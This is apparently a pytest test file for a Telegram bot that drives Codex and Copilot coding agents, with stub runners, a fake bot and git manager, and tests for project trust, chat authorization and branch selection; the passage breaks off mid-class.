from __future__ import annotations

import asyncio
import html
import sqlite3
import shlex
import sys
import threading
from pathlib import Path
from types import SimpleNamespace

import pytest
from coding_agent_telegram.agent_runner import AgentProgressInfo, AgentRunResult, AgentStallInfo
from coding_agent_telegram.command_router import CommandRouter, RouterDeps
from coding_agent_telegram.config import AppConfig
from coding_agent_telegram.session_store import SessionStore


class DummyRunner:
    def __init__(self):
        self.create_calls = []
        self.resume_calls = []

    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.create_calls.append(
            {
                "provider": provider,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id="sess_abc123",
            success=True,
            assistant_text="",
            error_message=None,
            raw_events=[],
        )

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="",
            error_message=None,
            raw_events=[],
        )


class CompactingRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="Current goal: finish compact flow.\nFiles changed: README.md\nNext step: continue safely.",
            error_message=None,
            raw_events=[],
        )

    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.create_calls.append(
            {
                "provider": provider,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        return AgentRunResult(
            session_id="sess_compacted",
            success=True,
            assistant_text="Handoff loaded.",
            error_message=None,
            raw_events=[],
        )


class MarkdownRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="See [agent_runner.py](/tmp/agent_runner.py) and `config.py`.",
            error_message=None,
            raw_events=[],
        )


class CommandBlockRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="Run this command:\n```bash\ngit commit -m \"test\"\n```",
            error_message=None,
            raw_events=[],
        )


class SessionIdRotatingRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id="sess_rotated",
            success=True,
            assistant_text="rotated",
            error_message=None,
            raw_events=[],
        )


class ResumeReplacementRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=None,
            success=False,
            assistant_text="",
            error_message="Failed to resume session.",
            raw_events=[],
        )


class LongEscapedMarkdownRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="\n".join(["<tag> & value" for _ in range(40)]),
            error_message=None,
            raw_events=[],
        )


class FakeBot:
    def __init__(self):
        self.messages = []
        self.actions = []
        self.deleted_messages = []

    async def send_message(self, chat_id, text, parse_mode=None, reply_markup=None):
        self.messages.append((chat_id, text, parse_mode, reply_markup))
        return SimpleNamespace(message_id=len(self.messages))

    async def edit_message_text(self, chat_id, message_id, text, parse_mode=None, reply_markup=None):
        self.messages.append((chat_id, text, parse_mode, reply_markup))

    async def delete_message(self, chat_id, message_id):
        self.deleted_messages.append((chat_id, message_id))

    async def send_chat_action(self, chat_id, action):
        self.actions.append((chat_id, action))


class FakeGitManager:
    def __init__(
        self,
        *,
        is_git_repo=False,
        current_branch=None,
        default_branch=None,
        local_branches=None,
        prepare_result=None,
        prepare_from_source_result=None,
        checkout_result=None,
        git_command_results=None,
        push_result=None,
    ):
        self._is_git_repo = is_git_repo
        self._current_branch = current_branch
        self._default_branch = default_branch
        self._local_branches = local_branches or []
        self.prepare_result = prepare_result
        self.prepare_from_source_result = prepare_from_source_result
        self.checkout_result = checkout_result
        self.git_command_results = list(git_command_results or [])
        self.push_result = push_result
        self.refresh_result = None
        self.git_commands = []
        self.safe_git_commands = []
        self.push_calls = []
        self.prepare_from_source_calls = []

    def is_git_repo(self, project_path):
        return self._is_git_repo

    def current_branch(self, project_path):
        return self._current_branch

    def default_branch(self, project_path):
        return self._default_branch

    def list_local_branches(self, project_path):
        return self._local_branches

    def local_branch_exists(self, project_path, branch_name):
        return branch_name in self._local_branches

    def remote_branch_exists(self, project_path, branch_name):
        return branch_name in self._local_branches or branch_name == self._default_branch

    def refresh_current_branch(self, project_path):
        return self.refresh_result

    def prepare_branch(self, project_path, *, origin_branch, new_branch):
        return self.prepare_result

    def prepare_branch_from_source(self, project_path, *, source_kind, source_branch, new_branch):
        self.prepare_from_source_calls.append((project_path, source_kind, source_branch, new_branch))
        if self.prepare_from_source_result is not None and getattr(self.prepare_from_source_result, "current_branch", None):
            self._current_branch = self.prepare_from_source_result.current_branch
        return self.prepare_from_source_result

    def checkout_branch(self, project_path, branch_name):
        if self.checkout_result is not None and getattr(self.checkout_result, "success", False):
            self._current_branch = getattr(self.checkout_result, "current_branch", branch_name)
        return self.checkout_result

    def run_git_command(self, project_path, args):
        self.git_commands.append((project_path, args))
        if self.git_command_results:
            return self.git_command_results.pop(0)
        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")

    def run_safe_commit_command(self, project_path, args):
        self.safe_git_commands.append((project_path, args))
        if self.git_command_results:
            return self.git_command_results.pop(0)
        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")

    def push_branch(self, project_path, branch_name):
        self.push_calls.append((project_path, branch_name))
        if self.push_result is not None:
            return self.push_result
        return SimpleNamespace(success=True, message=f"Pushed branch '{branch_name}' to origin.", current_branch=branch_name)


class FakeTelegramFile:
    def __init__(self, content: bytes, file_path: str):
        self._content = content
        self.file_path = file_path

    async def download_as_bytearray(self):
        return bytearray(self._content)


class FakePhotoSize:
    def __init__(self, telegram_file: FakeTelegramFile, *, file_size=None):
        self.telegram_file = telegram_file
        self.file_size = file_size if file_size is not None else len(getattr(telegram_file, "_content", b""))

    async def get_file(self):
        return self.telegram_file


def make_update(chat_id=123, chat_type="private", text="hello"):
    return SimpleNamespace(
        effective_chat=SimpleNamespace(id=chat_id, type=chat_type),
        message=SimpleNamespace(text=text, photo=None, caption=None),
    )


def make_config(tmp_path: Path, *, locale: str = "en") -> AppConfig:
    return AppConfig(
        workspace_root=tmp_path,
        state_file=tmp_path / "state.json",
        state_backup_file=tmp_path / "state.json.bak",
        log_level="INFO",
        log_dir=tmp_path / "logs",
        telegram_bot_tokens=("x",),
        allowed_chat_ids={123},
        codex_bin=sys.executable,
        copilot_bin=sys.executable,
        codex_model="",
        copilot_model="",
        copilot_autopilot=True,
        copilot_no_ask_user=True,
        copilot_allow_all=True,
        copilot_allow_all_tools=False,
        copilot_allow_tools=(),
        copilot_deny_tools=(),
        copilot_available_tools=(),
        codex_approval_policy="never",
        codex_sandbox_mode="workspace-write",
        codex_skip_git_repo_check=False,
        enable_commit_command=False,
        snapshot_text_file_max_bytes=200000,
        max_telegram_message_length=3000,
        enable_sensitive_diff_filter=True,
        enable_secret_scrub_filter=True,
        default_agent_provider="codex",
        agent_hard_timeout_seconds=0,
        app_internal_root=tmp_path / ".coding-agent-telegram",
        locale=locale,
    )


def seed_codex_native_session(
    home: Path,
    *,
    session_id: str,
    cwd: Path,
    title: str,
    branch: str,
    created_at: int,
    updated_at: int,
) -> None:
    codex_dir = home / ".codex"
    codex_dir.mkdir(parents=True, exist_ok=True)
    db_path = codex_dir / "state_5.sqlite"
    conn = sqlite3.connect(db_path)
    try:
        conn.execute(
            """
            CREATE TABLE threads (
                id TEXT PRIMARY KEY,
                cwd TEXT NOT NULL,
                title TEXT NOT NULL,
                first_user_message TEXT NOT NULL,
                git_branch TEXT,
                created_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL,
                archived INTEGER NOT NULL DEFAULT 0
            )
            """
        )
        conn.execute(
            """
            INSERT INTO threads (id, cwd, title, first_user_message, git_branch, created_at, updated_at, archived)
            VALUES (?, ?, ?, ?, ?, ?, ?, 0)
            """,
            (session_id, str(cwd), title, title, branch, created_at, updated_at),
        )
        conn.commit()
    finally:
        conn.close()


def seed_copilot_native_session(
    store_root: Path,
    *,
    session_id: str,
    branch: str,
    created_at: str,
    updated_at: str,
    summary: str = "",
    with_events: bool = True,
    cwd: Path | None = None,
) -> None:
    session_dir = store_root / ".copilot" / "session-state" / session_id
    session_dir.mkdir(parents=True, exist_ok=True)
    session_cwd = cwd or store_root
    lines = [
        f"id: {session_id}",
        f"cwd: {session_cwd}",
        f"git_root: {session_cwd}",
        f"branch: {branch}",
        f"created_at: {created_at}",
        f"updated_at: {updated_at}",
    ]
    if summary:
        lines.append(f"summary: {summary}")
    else:
        lines.append("summary_count: 0")
    (session_dir / "workspace.yaml").write_text("\n".join(lines) + "\n", encoding="utf-8")
    if with_events:
        (session_dir / "events.jsonl").write_text("", encoding="utf-8")


def test_project_command_rejects_path(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend/api"], bot=bot)

    asyncio.run(router.handle_project(update, context))
    assert "Invalid project folder" in bot.messages[-1][1]


def test_unauthorized_chat_is_ignored_silently(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(chat_id=999)
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages == []


def test_group_chat_is_ignored_silently(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(chat_type="group")
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages == []


def test_project_command_creates_missing_folder(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert (tmp_path / "backend").is_dir()
    assert store.get_chat_state("bot-a", 123)["current_project_folder"] == "backend"
    assert store.is_project_trusted("backend") is True
    assert "Project: <code>backend</code>" in bot.messages[0][1]


def test_project_command_warns_when_existing_project_is_untrusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages[-1][1] == "Do you trust this project?\nProject: <code>backend</code>"
    assert bot.messages[-1][3] is not None
    assert store.is_project_trusted("backend") is False


def test_project_command_reports_current_branch_for_git_repo(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[0][1]
    assert "Project changed to: backend" in message
    assert "Branch selection is required" in message
    assert "Current branch in repo: main" in message
    assert "Select a branch with:" in message
    assert "current_branch" not in store.get_chat_state("bot-a", 123)


def test_project_command_is_localized_in_zh_tw(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path, locale="zh-TW")
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[0][1]
    assert "已切換專案至：backend" in message
    assert "必須先選擇 branch" in message
    assert "儲存庫目前 branch：main" in message
    assert "請用以下指令選擇 branch：" in message


def test_project_command_warns_when_active_session_belongs_to_another_project(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_1", "old-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["frontend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[0][1]
    assert "Active Session Mismatch" in message
    assert "Session project: <code>backend</code>" in message
    assert "Start a new session with <code>/new</code>" in message


def test_trust_project_callback_marks_project_trusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    answers = []
    edited = []
    query = SimpleNamespace(
        data="trustproject:yes:backend",
        answer=lambda: answers.append("answered"),
        edit_message_text=lambda text: edited.append(text),
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes:backend",
            answer=(lambda: None),
            edit_message_text=(lambda text: None),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert store.is_project_trusted("backend") is True
    assert edited[-1] == "Project trusted: backend"


def test_unauthorized_trust_project_callback_is_answered_without_side_effects(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    answers = []
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=999, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes:backend",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert answers == ["answered"]
    assert edited == []
    assert bot.messages == []
    assert store.is_project_trusted("backend") is False


def test_branch_command_requires_project_first(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "No project selected." in bot.messages[-1][1]


def test_branch_command_lists_branches_when_project_is_set(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        default_branch="main",
        local_branches=["main", "feature-1", "feature-2"],
    )
    router.git.refresh_result = SimpleNamespace(
        success=True,
        message="Updated branch 'feature-1' from origin.",
        current_branch="feature-1",
        default_branch="main",
        warnings=(),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Project: backend" in message
    assert "Current branch in repo: feature-1" in message
    assert "Default branch: main" in message
    assert "* feature-1 (current branch in repo)" in message
    assert "- main (default)" in message
    assert "Select a branch with:" in message


def test_branch_command_lists_branches_even_when_refresh_warns(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-deleted-remote",
        default_branch="main",
        local_branches=["main", "feature-deleted-remote"],
    )
    router.git.refresh_result = SimpleNamespace(
        success=True,
        message="Updated branch 'feature-deleted-remote' from origin.",
        current_branch="feature-deleted-remote",
        default_branch="main",
        warnings=("git pull failed for branch: feature-deleted-remote",),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Refresh warnings:" in message
    assert "git pull failed for branch: feature-deleted-remote" in message
    assert "* feature-deleted-remote (current branch in repo)" in message
    assert "- main (default)" in message


def test_branch_command_uses_default_branch_when_origin_not_provided(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Created branch 'feature-1' from origin/main.",
            current_branch="feature-1",
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-1"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Creating a new branch from the following branch source: feature-1" in bot.messages[-1][1]
    assert "Choose the branch source:" in bot.messages[-1][1]
    assert "Branch target: feature-1" in bot.messages[-1][1]
    reply_markup = bot.messages[-1][3]
    assert reply_markup is not None

    query = SimpleNamespace(
        data="branchsource:origin:main:feature-1",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "Created branch" in edited[-1][0]
    assert "feature-1" in edited[-1][0]
    assert "Current branch: feature-1" in edited[-1][0]
    assert store.get_chat_state("bot-a", 123)["current_branch"] == "feature-1"


def test_branch_command_is_localized_in_zh_tw(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path, locale="zh-TW")
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Created branch 'feature-1' from origin/main.",
            current_branch="feature-1",
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-1"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "要建立新 branch feature-1" in message
    assert "請選擇 branch 來源：" in message
    assert "目標 branch：feature-1" in message

    query = SimpleNamespace(
        data="branchsource:origin:main:feature-1",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "目前 branch：feature-1" in edited[-1][0]


def test_branch_command_for_new_branch_offers_current_and_default_sources(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-enhancements",
        default_branch="main",
        local_branches=["main", "feature-enhancements"],
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["new-feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Creating a new branch from the following branch source: new-feature" in message
    assert "Current branch in repo: feature-enhancements" in message
    assert "Default branch: main" in message
    reply_markup = bot.messages[-1][3]
    assert reply_markup is not None
    labels = [button.text for row in reply_markup.inline_keyboard for button in row]
    assert labels == [
        "local/feature-enhancements",
        "origin/feature-enhancements",
        "local/main",
        "origin/main",
    ]


def test_branch_command_switches_to_existing_branch(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.create_session("bot-a", 123, "sess_branch", "branch-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        local_branches=["main", "feature-1"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Switched to existing local branch 'main'.",
            current_branch="main",
            default_branch="main",
        ),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["main"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Switching branch to main requires choosing a source first." in bot.messages[-1][1]
    assert "Choose the branch source:" in bot.messages[-1][1]
    query = SimpleNamespace(
        data="branchsource:local:main:main",
        answer=None,
        edit_message_text=None,
    )
    callback_update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
    )
    edited = []

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit
    asyncio.run(router.handle_branch_source_callback(callback_update, context))

    assert "Switched to existing local branch" in edited[-1][0]
    assert "Current branch: main" in edited[-1][0]
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "main"
    assert state["sessions"]["sess_branch"]["branch_name"] == "main"


class StallingRunner(DummyRunner):
    def create_session(
        self,
        provider,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        if on_stall is not None:
            on_stall(
                AgentStallInfo(
                    command=("codex", "exec"),
                    elapsed_seconds=18.0,
                    idle_seconds=18.0,
                    seen_output=False,
                    last_stderr="",
                )
            )
        return super().create_session(
            provider,
            project_path,
            user_message,
            skip_git_repo_check=skip_git_repo_check,
            image_paths=image_paths,
            on_stall=on_stall,
            on_progress=on_progress,
        )

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        if on_stall is not None:
            on_stall(
                AgentStallInfo(
                    command=("codex", "exec", "resume"),
                    elapsed_seconds=18.0,
                    idle_seconds=18.0,
                    seen_output=False,
                    last_stderr="",
                )
            )
        return super().resume_session(
            provider,
            session_id,
            project_path,
            user_message,
            skip_git_repo_check=skip_git_repo_check,
            image_paths=image_paths,
            on_stall=on_stall,
            on_progress=on_progress,
        )


class ProgressRunner(DummyRunner):
    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        if on_progress is not None:
            on_progress(
                AgentProgressInfo(
                    command=("codex", "exec", "resume"),
                    elapsed_seconds=5.0,
                    text="Indexing files...",
                    source="stdout",
                )
            )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


class BlockingRunner(DummyRunner):
    def __init__(self):
        super().__init__()
        self._condition = threading.Condition()
        self._started_count = 0
        self._released_count = 0

    def has_running_process(self, _project_path):
        with self._condition:
            return self._started_count > self._released_count

    def wait_started(self, count: int, timeout: float = 1.0) -> bool:
        with self._condition:
            return self._condition.wait_for(lambda: self._started_count >= count, timeout=timeout)

    def release_next(self) -> None:
        with self._condition:
            self._released_count += 1
            self._condition.notify_all()

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        with self._condition:
            self._started_count += 1
            my_run = self._started_count
            self._condition.notify_all()
            self._condition.wait_for(lambda: self._released_count >= my_run, timeout=30)
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


class AbortableBlockingRunner(BlockingRunner):
    def __init__(self):
        super().__init__()
        self._abort_current = False

    def abort_running_process(self, _project_path):
        with self._condition:
            if self._started_count <= self._released_count:
                return False
            self._abort_current = True
            self._released_count += 1
            self._condition.notify_all()
            return True

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        with self._condition:
            self._started_count += 1
            my_run = self._started_count
            self._condition.notify_all()
            self._condition.wait_for(lambda: self._released_count >= my_run, timeout=30)
